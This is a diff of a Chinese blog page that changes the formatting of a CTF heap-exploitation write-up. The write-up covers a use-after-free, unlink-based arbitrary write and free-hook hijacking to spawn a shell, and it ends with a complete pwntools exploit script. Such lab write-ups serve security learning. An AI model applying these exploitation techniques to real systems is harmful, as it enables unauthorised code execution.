@@ -19,14 +19,14 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"summ2.link","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.23.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="堆的内部结构  在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。  1234567891011121314151617&#x2F;*  This struct declaration is misleading (but accurate and necessary).  It declares a &quot;vi">
+    <meta name="description" content="堆的内部结构  在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。  &#x2F;*   This struct declaration is misleading (but accurate and necessary).   It declares a &quot;view&quot; into memory allowin">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Heap1sEz - 堆漏洞的简单利用">
 <meta property="og:url" content="http://summ2.link/categories/CTF/heap1sEz/index.html">
 <meta property="og:site_name" content="蘅芷清芬">
-<meta property="og:description" content="堆的内部结构  在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。  1234567891011121314151617&#x2F;*  This struct declaration is misleading (but accurate and necessary).  It declares a &quot;vi">
+<meta property="og:description" content="堆的内部结构  在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。  &#x2F;*   This struct declaration is misleading (but accurate and necessary).   It declares a &quot;view&quot; into memory allowin">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://summ2.link/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20241006122827910.png">
 <meta property="og:image" content="http://summ2.link/2024101-Heap1sEz---%E5%A0%86%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/image-20241006124624160.png">
@@ -271,7 +271,23 @@
 <p>在程序的执行过程中，我们称由 malloc 申请的内存为 <code>chunk</code>
 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。</p>
 </blockquote>
-<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> {</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight c++"><span class="comment">/*</span>
+<span class="comment">  This struct declaration is misleading (but accurate and necessary).</span>
+<span class="comment">  It declares a "view" into memory allowing access to necessary</span>
+<span class="comment">  fields at known offsets from a given base. See explanation below.</span>
+<span class="comment">*/</span>
+<span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> {
+
+  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span>
+  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span>
+
+  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span>
+  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;
+
+  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span>
+  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span>
+  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;
+};</code></pre>
 <p>关于堆的结构很重要的一点在于，其使用和 free
 状态下的结构一致，只是相应功能有区别。例如使用时 fd
 段用于存储数据，可以通过某些方法把不合法的数据写入一个 free chunk 的 fd
@@ -287,13 +303,34 @@
 <code>show</code> , <code>delete</code> 几个函数构成。其中
 <code>gift</code> 函数直接让我们可以进行 <code>__free_hook</code>
 劫持。</p>
-<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">gift</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"give me a hook\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%p"</span>, &amp;hook) &lt;= <span class="number">0</span>)</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight c++"><span class="function"><span class="type">void</span> <span class="title">gift</span><span class="params">()</span></span>{
+    <span class="built_in">printf</span>(<span class="string">"give me a hook\n"</span>);
+    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">"%p"</span>, &amp;hook) &lt;= <span class="number">0</span>)
+        _exit(<span class="number">1</span>);
+}</code></pre>
 <p>因此考虑通过 <code>__free_hook</code> 劫持执行
 <code>system('/bin/sh')</code> 得到 shell。</p>
 <p>在 <code>delete</code>
 函数中给定内存块被释放，但是对应的指针没有被设置为 NULL，存在 Use After
 Free 漏洞。</p>
-<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;index);</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">16</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"There are only 16 pages in this notebook.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (notes[index] == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Page not found.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(notes[index]); <span class="comment">//没有置空</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight c++"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">()</span> </span>{
+    <span class="type">unsigned</span> <span class="type">int</span> index;
+
+    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);
+    <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;index);
+    <span class="keyword">if</span> (index &gt;= <span class="number">16</span>) {
+        <span class="built_in">printf</span>(<span class="string">"There are only 16 pages in this notebook.\n"</span>);
+        <span class="keyword">return</span>;
+    }
+
+    <span class="keyword">if</span> (notes[index] == <span class="literal">NULL</span>) {
+        <span class="built_in">printf</span>(<span class="string">"Page not found.\n"</span>);
+        <span class="keyword">return</span>;
+    }
+
+    <span class="built_in">free</span>(notes[index]); <span class="comment">//没有置空</span>
+    <span class="keyword">return</span>;
+}</code></pre>
 <h1 id="攻击流程">攻击流程</h1>
 <h2 id="泄露程序基址">泄露程序基址</h2>
 <p>由于程序打开了
@@ -311,11 +348,42 @@ Bin。这里 chunk1 的 fd 就会指向某个与 <code>main_arena</code>
 <h2 id="泄露-libc-基址">泄露 libc 基址</h2>
 <p>得到程序基址后，为了得到 <code>system</code> 函数的地址，还需要获得
 libc 基址。而程序中唯一可利用的输出函数位于 <code>show</code> 函数中</p>
-<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;index);</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">16</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"There are only 16 pages in this notebook.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (notes[index] == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Page not found.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(notes[index]); <span class="comment">//可以利用</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight c++"><span class="function"><span class="type">void</span> <span class="title">show</span><span class="params">()</span> </span>{
+    <span class="type">unsigned</span> <span class="type">int</span> index;
+
+    <span class="built_in">printf</span>(<span class="string">"Index: "</span>);
+    <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;index);
+    <span class="keyword">if</span> (index &gt;= <span class="number">16</span>) {
+        <span class="built_in">printf</span>(<span class="string">"There are only 16 pages in this notebook.\n"</span>);
+        <span class="keyword">return</span>;
+    }
+
+    <span class="keyword">if</span> (notes[index] == <span class="literal">NULL</span>) {
+        <span class="built_in">printf</span>(<span class="string">"Page not found.\n"</span>);
+        <span class="keyword">return</span>;
+    }
+
+    <span class="built_in">puts</span>(notes[index]); <span class="comment">//可以利用</span>
+
+    <span class="keyword">return</span>;
+}</code></pre>
 <p>我们需要尝试将 <code>notes[index]</code> 修改为一个 got
 表中的值，例如 <code>read@got[plt]</code> 。</p>
 <h2 id="利用-unlink-实现任意地址读写">利用 unlink 实现任意地址读写</h2>
-<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unlink_chunk</span> (mchunkptr p)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span> (p) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span> (p)))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;                                                 </span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span></span><br><span class="line">    <span class="comment">//malloc_printerr ("corrupted double-linked list");</span></span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight c++"><span class="built_in">unlink_chunk</span> (mchunkptr p)
+{
+  <span class="keyword">if</span> (<span class="built_in">chunksize</span> (p) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span> (p)))
+    <span class="built_in">malloc_printerr</span> (<span class="string">"corrupted size vs. prev_size"</span>);
+
+  mchunkptr fd = p-&gt;fd;                                                 
+  mchunkptr bk = p-&gt;bk;
+
+  <span class="comment">//if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))</span>
+    <span class="comment">//malloc_printerr ("corrupted double-linked list");</span>
+
+  fd-&gt;bk = bk;
+  bk-&gt;fd = fd;
+}</code></pre>
 <blockquote>
 <ul>
 <li>FD=P-&gt;fd = target addr - 0x18</li>
@@ -343,14 +411,79 @@ unlink 相关代码。</p>
 <h2 id="执行-systembinsh">执行 <code>system('/bin/sh')</code></h2>
 <h3 id="传参">传参</h3>
 <p>观察 <code>__free_hook</code> 相关的代码，可以发现</p>
-<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="built_in">free</span>(notes[index]);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">(<span class="type">void</span> *mem)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  mchunkptr p;                 <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  {</span><br><span class="line">    (*hook)(mem);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  }</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight c++"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">()</span> </span>{
+    <span class="comment">//...</span>
+    <span class="built_in">free</span>(notes[index]);
+    <span class="keyword">return</span>;
+}
+<span class="function"><span class="type">void</span> <span class="title">free</span><span class="params">(<span class="type">void</span> *mem)</span></span>
+<span class="function"></span>{
+  mchunkptr p;                 <span class="comment">/* chunk corresponding to mem */</span>
+  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span>
+  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span>
+  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span>
+  <span class="type">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span>
+  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span>
+  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span>
+  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span>
+  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))
+  {
+    (*hook)(mem);
+    <span class="keyword">return</span>;
+  }
+    <span class="comment">//...</span></code></pre>
 <p>只需要将 <code>mem</code> 对应的位置修改为 <code>'/bin/sh'</code>
 即可，而使用程序中自带的 edit 功能就能实现。</p>
 <h3 id="free_hook-劫持"><code>__free_hook</code> 劫持</h3>
 <p>这题直接提供了后门函数 <code>gift</code> 用于修改
 <code>&amp;hook</code> 上的值。</p>
 <h1 id="exp">exp</h1>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span> </span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./vuln"</span>)</span><br><span class="line"><span class="comment">#p = remote("182.202.178.28",31639)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendline(<span class="string">b"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))    </span><br><span class="line">    p.sendlineafter(<span class="string">"Content: "</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">bss_addr = u64(p.recvuntil(<span class="string">'\x0a\x77\x65'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">elfbase = bss_addr + <span class="number">0x8</span> - <span class="number">0x3810</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"bss:"</span>,<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">note = elfbase + <span class="number">0x3880</span></span><br><span class="line">puts = elfbase + <span class="number">0x3768</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">16</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(note-<span class="number">0x18</span>)+p64(puts))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x0a\x77\x65'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">add(<span class="number">6</span>,<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b"/bin/sh"</span>)</span><br><span class="line">p.sendline(<span class="string">b"6"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b"give me a hook\n"</span>,<span class="built_in">hex</span>(sys_addr))</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+context.log_level = <span class="string">"debug"</span>
+context.arch = <span class="string">"amd64"</span> 
+libc = ELF(<span class="string">"./libc.so.6"</span>)
+p = process(<span class="string">"./vuln"</span>)
+<span class="comment">#p = remote("182.202.178.28",31639)</span>
+<span class="comment">#gdb.attach(p)</span>
+<span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):
+    p.sendline(<span class="string">b"1"</span>)
+    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))
+    p.sendlineafter(<span class="string">"Size: "</span>,<span class="built_in">str</span>(size))
+<span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):
+    p.sendline(<span class="string">b"2"</span>)
+    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))
+<span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):
+    p.sendline(<span class="string">b"3"</span>)
+    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))    
+    p.sendlineafter(<span class="string">"Content: "</span>,content)
+<span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):
+    p.sendline(<span class="string">b"4"</span>)
+    p.sendlineafter(<span class="string">"Index:"</span>,<span class="built_in">str</span>(index))
+add(<span class="number">2</span>,<span class="number">8</span>)
+add(<span class="number">3</span>,<span class="number">8</span>)
+dele(<span class="number">2</span>)
+dele(<span class="number">3</span>)
+show(<span class="number">2</span>)
+bss_addr = u64(p.recvuntil(<span class="string">'\x0a\x77\x65'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))
+elfbase = bss_addr + <span class="number">0x8</span> - <span class="number">0x3810</span>
+<span class="built_in">print</span>(<span class="string">"bss:"</span>,<span class="built_in">hex</span>(bss_addr))
+note = elfbase + <span class="number">0x3880</span>
+puts = elfbase + <span class="number">0x3768</span>
+add(<span class="number">0</span>,<span class="number">16</span>)
+add(<span class="number">1</span>,<span class="number">16</span>)
+dele(<span class="number">0</span>)
+edit(<span class="number">0</span>,p64(note-<span class="number">0x18</span>)+p64(puts))
+dele(<span class="number">1</span>)
+show(<span class="number">0</span>)
+puts_addr = u64(p.recvuntil(<span class="string">'\x0a\x77\x65'</span>,drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))
+libc_base = puts_addr - libc.sym[<span class="string">"puts"</span>]
+sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]
+add(<span class="number">6</span>,<span class="number">8</span>)
+edit(<span class="number">6</span>,<span class="string">b"/bin/sh"</span>)
+p.sendline(<span class="string">b"6"</span>)
+p.sendlineafter(<span class="string">b"give me a hook\n"</span>,<span class="built_in">hex</span>(sys_addr))
+dele(<span class="number">6</span>)
+p.interactive()</code></pre>
 
     </div>
 
